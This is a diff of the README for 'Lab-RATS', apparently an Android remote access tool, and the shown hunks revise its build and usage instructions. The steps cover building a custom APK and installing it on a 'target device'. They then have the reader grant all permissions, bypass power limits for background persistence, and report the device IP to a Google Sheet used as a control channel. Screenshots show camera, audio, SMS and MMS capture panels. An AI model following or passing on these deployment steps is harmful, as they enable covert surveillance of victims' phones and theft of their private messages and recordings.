@@ -53,7 +53,7 @@
 <p align="center">
  <a href='https://postimg.cc/2VbLY8CV' target='_blank'><img src='https://i.postimg.cc/2VbLY8CV/Lab-RATS-APK-screen.jpg' border='0' alt='Lab-RATS-APK-screen'></a>
 
-<p align="center"> --- > Live Streaming Target Device on PC through Remote Web Server < ---
+<p align="center"> --- > Live Streaming Target Device on PC Using Remote Web Server < ---
 
 <a href="https://postimg.cc/LJpWkwWh" target="_blank"><img src="https://i.postimg.cc/LJpWkwWh/Lab-RATS-WEBHomepage.png" alt="Lab-RATS-WEBHomepage"></a> <a href="https://postimg.cc/ftmztxd9" target="_blank"><img src="https://i.postimg.cc/ftmztxd9/Lab-RATS-Camera-menu.png" alt="Lab-RATS-Camera-menu"></a> <a href="https://postimg.cc/gX8zXvh6" target="_blank"><img src="https://i.postimg.cc/gX8zXvh6/Lab-RATS-Cam-record.png" alt="Lab-RATS-Cam-record"></a> <a href="https://postimg.cc/YGYrG1FG" target="_blank"><img src="https://i.postimg.cc/YGYrG1FG/Lab-RATS-Audio.png" alt="Lab-RATS-Audio"></a> <a href="https://postimg.cc/R3G2ZdXL" target="_blank"><img src="https://i.postimg.cc/R3G2ZdXL/Lab-RATS-SMS.png" alt="Lab-RATS-SMS"></a> <a href="https://postimg.cc/HcXYcQMB" target="_blank"><img src="https://i.postimg.cc/HcXYcQMB/Lab-RATS-MMS.png" alt="Lab-RATS-MMS"></a> 
 
@@ -88,27 +88,27 @@ During **security research**, a **fascinating behavior** in **modern Android net
 2.  **Navigate** to the `app-builder/` directory.
 3.  **Run** the builder **script**:
     -   **Windows**: Double-click `build.bat`
-    -   **Linux/Mac**: In Terminal run `chmod +x build.sh` then `./build.sh`
-4.  **Follow** the **prompts** to **configure**:
+    -   **Linux/Mac**: In terminal from `/Lab-RATS/app-builder/` run `chmod +x build.sh` then `./build.sh`
+4.  **Follow** the **on-screen prompts** to **configure APK**:
     -   **Pick** Number 1 to **build the APK**
     -   **App Name**: *(Default: Lab-RATS)*
     -   **Package Name**: *(Default: com.labs.k4n3co)*
     -   **Google Sheet URL**: Paste in your **Apps Script Web App URL** *(Google Sheet set-up instructions below)*.
-5.  The **final APK** will be **generated** in `app-builder/output/`.
+5.  The **final APK** will be **generated** in `/app-builder/output/`.
 
 ### 3. Usage
 1.  **Install** the **generated APK** onto the **target device**.
-2.  **Open the app** and **grant all** requested **Permissions except for Notifications**.
+2.  **Open the app** and **grant all** requested **permissions except for notifications**.
 3.  Click **"BYPASS_POWER_LIMITS"** to ensure background **persistence**.
-4.  Click **"Initialize Server"**.
-5.  The **Device IP** will appear in your **Google Sheet**. Open the link to **access the Remote Web Control Panel**.
+4.  Click **"INITIALIZE SERVER"**.
+5.  The **device IP** will appear in your **Google Sheet**. Open the link to **Access the Remote Web Control Panel**.
 
 ---
 
 ## 📊 Google Sheet Setup 
 
 1. Create **Google Sheet**
-2. **Extensions** → **Apps Script**
+2. Go to **Extensions** → **Apps Script**
 3. **Paste** this **Code** in:
 
 ```javascript
@@ -142,7 +142,7 @@ function setupSheet() {
 }
 ```
 4. **Deploy** → **Web App** → **Anyone**
-5. **Copy URL** → **Paste** into **APK builder** when asked.
+5. **Copy URL** → **Paste** into **APK builder** during build when asked.
 
 
 ---------------------------*Example Google Sheet - Running & Properly Configured*-------------------------------
